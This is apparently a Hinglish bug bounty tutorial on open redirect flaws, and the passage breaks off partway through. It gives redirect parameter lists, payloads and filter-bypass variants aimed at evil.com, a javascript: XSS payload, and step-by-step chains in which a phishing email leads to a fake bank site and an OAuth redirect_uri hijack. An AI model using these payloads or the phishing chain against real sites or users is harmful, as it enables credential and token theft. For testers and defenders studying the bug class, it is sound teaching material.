---
title: Open Redirect Simple Bug, Powerful Chains: Phishing Se OAuth Bypass Tak! (Hinglish Mein)
url: https://infosecwriteups.com/open-redirect-simple-bug-powerful-chains-phishing-se-oauth-bypass-tak-hinglish-mein-7d1b9adf8dcb?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2026-04-30
fetch_date: 2026-05-01T05:38:04.132393
---

# Open Redirect Simple Bug, Powerful Chains: Phishing Se OAuth Bypass Tak! (Hinglish Mein)

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fopen-redirect-simple-bug-powerful-chains-phishing-se-oauth-bypass-tak-hinglish-mein-7d1b9adf8dcb&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fopen-redirect-simple-bug-powerful-chains-phishing-se-oauth-bypass-tak-hinglish-mein-7d1b9adf8dcb&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-7d1b9adf8dcb---------------------------------------)

·

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-7d1b9adf8dcb---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

# Open Redirect Simple Bug, Powerful Chains: Phishing Se OAuth Bypass Tak! (Hinglish Mein)

[![Hacker MD](https://miro.medium.com/v2/resize:fill:64:64/1*mArHieH3GY7HX9TX7ZAoIg.jpeg)](https://medium.com/%40HackerMD?source=post_page---byline--7d1b9adf8dcb---------------------------------------)

[Hacker MD](https://medium.com/%40HackerMD?source=post_page---byline--7d1b9adf8dcb---------------------------------------)

7 min read

·

Apr 24, 2026

--

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D7d1b9adf8dcb&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fopen-redirect-simple-bug-powerful-chains-phishing-se-oauth-bypass-tak-hinglish-mein-7d1b9adf8dcb&source=---header_actions--7d1b9adf8dcb---------------------post_audio_button------------------)

Share

Press enter or click to view image in full size

![]()

**Series: Bug Bounty Zero se Hero 🦸 | Article #22**
*By HackerMD | 16 min read*

## Aaj Kya Seekhenge?

* Open Redirect kya hai bilkul basics se
* Kahan dhundhen input points
* Bypass techniques elite level
* Impact chains phishing, OAuth bypass, SSRF
* Automated + Manual testing
* Complete bug bounty workflow

> **Kyun zaroori hai?** Open Redirect akele **$100-$500** bounty deta hai lekin **SSRF ke saath, OAuth bypass ke saath, ya phishing chain mein** yeh **Critical** ban jaata hai! Ek simple parameter se **account takeover** possible hai!

## Open Redirect Kya Hai? Simple Analogy

Socho ek **Trusted Receptionist** hai company mein:

```
Normal:
Visitor: "Mujhe Conference Room A le chalo"
Receptionist: Conference Room A le jaata hai ✅

Open Redirect:
Attacker: "Visitor ko yahan se evil building
           mein le jaao" — forged note
Receptionist: "Theek hai!" — blindly follow karta hai! 😱

Problem:
→ Visitor ne trusted company ka naam dekha
→ Socha legitimate redirect hai
→ Actually evil site pe pahunch gaya!
```

**Website mein:**

```
Legitimate URL:
https://trusted-bank.com/login?next=https://trusted-bank.com/dashboard

Attacker ka URL:
https://trusted-bank.com/login?next=https://evil-phishing.com

→ User trusted-bank.com ka link dekhta hai
→ Click karta hai → evil-phishing.com pe redirect!
→ Apna password enter karta hai! 😱
```

## PART 1: Kahan Dhundhen Parameter Names

```
# ─── COMMON REDIRECT PARAMETERS ──────────
?next=
?url=
?redirect=
?redirect_url=
?redirect_uri=
?return=
?return_url=
?returnUrl=
?returnTo=
?goto=
?dest=
?destination=
?target=
?link=
?to=
?ref=
?location=
?continue=
?forward=
?go=
?r=
?redir=
?out=
?view=
?callback=
?from=
?exit=

# ─── OAUTH/SSO SPECIFIC ──────────────────
?redirect_uri=
?callback_url=
?post_logout_redirect_uri=
?success_url=
?error_url=
?after_login=
?after_logout=

# ─── HTTP HEADERS ─────────────────────────
Referer: header
Location: response header
```

## PART 2: Basic Payloads Test Karo

## Basic Test:

```
# Pehle apna server setup karo:
# Interactsh ya simple Python server:
python3 -m http.server 8888

# Basic payloads:
?next=https://evil.com
?url=https://evil.com
?redirect=https://evil.com
?redirect_uri=https://evil.com

# Agar redirect hota hai → Open Redirect confirmed! ✅
```

## Variations Try Karo:

```
# Protocol variations:
?url=https://evil.com
?url=http://evil.com
?url=//evil.com          ← Protocol-relative!
?url=\/\/evil.com
?url=\\evil.com

# JavaScript protocol:
?url=javascript:alert(1)  ← XSS bhi possible!
?url=data:text/html,<script>alert(1)</script>
```

## PART 3: Bypass Techniques Elite Level!

## Bypass 1: @ Symbol Trick

```
# Browser URL parsing:
https://trusted.com@evil.com
→ Browser evil.com pe jaata hai!
→ User sirf "trusted.com" dekhta hai URL mein!

?url=https://trusted.com@evil.com
?redirect=https://target.com@evil.com
```

## Bypass 2: Subdomain Confusion

```
?url=https://evil.com.target.com
# Agar server check kare "target.com" string
# → evil.com.target.com bhi pass ho jaata hai!

?url=https://target.com.evil.com
?url=https://evil-target.com
?url=https://evilXtarget.com
```

## Bypass 3: URL Fragment

```
?url=https://evil.com#target.com
?url=https://evil.com#.target.com
?url=https://evil.com/.target.com
# Fragment ke baad target.com — filter bypass!
```

## Bypass 4: CRLF + Whitespace

```
?url=https://evil.com%09
?url=https://evil.com%0a
?url=https://evil.com%0d
?url=https://evil.com%00
?url=%20https://evil.com
?url=%0ahttps://evil.com
```

## Bypass 5: Double Slash

```
?url=//evil.com
?url=///evil.com
?url=////evil.com
?url=https:///evil.com
?url=/\evil.com
?url=\/evil.com
```

## Bypass 6: URL Encoding

```
?url=https%3A%2F%2Fevil.com
?url=https%3A//evil.com
?url=%68%74%74%70%73%3A%2F%2Fevil.com
# Double encoding:
?url=https%253A%252F%252Fevil.com
```

## Bypass 7: IP Address

```
?url=http://1.2.3.4         → IP directly
?url=http://0x1.0x2.0x3.0x4 → Hex IP
?url=http://16909060         → Decimal IP of 1.2.3.4
```

## Bypass 8: Open Redirect via Referer

```
GET /logout HTTP/1.1
Host: target.com
Referer: https://evil.com

# Logout ke baad Referer pe redirect kare?
→ Open Redirect via header!
```

## PART 4: Impact Chains Yahan Asli Power Hai!

## Chain 1: Open Redirect → Phishing

```
Step 1: Open Redirect dhundho:
https://trusted-bank.com/login?next=https://evil.com

Step 2: Evil site banao — trusted bank jaisi dikhti ho

Step 3: Email bhejo victim ko:
"Your account is compromised!
Click here to secure: https://trusted-bank.com/login?next=https://evil.com"

Step 4: Victim:
→ URL mein trusted-bank.com dekhta hai ✅
→ Click karta hai
→ Evil site pe redirect hota hai
→ Password enter karta hai → STOLEN! 💀

Impact: High → Critical!
Bounty: $500-$2000
```

## Chain 2: Open Redirect → OAuth Token Steal CRITICAL!

```
OAuth flow normal:
1. User → "Login with Google" click karta hai
2. Google → target.com/callback?code=ABC pe redirect karta hai
3. target.com code se access token leta hai

OAuth + Open Redirect attack:
1. target.com/oauth/start?redirect_uri=https://evil.com dhundho
2. Google ko lagta hai legitim...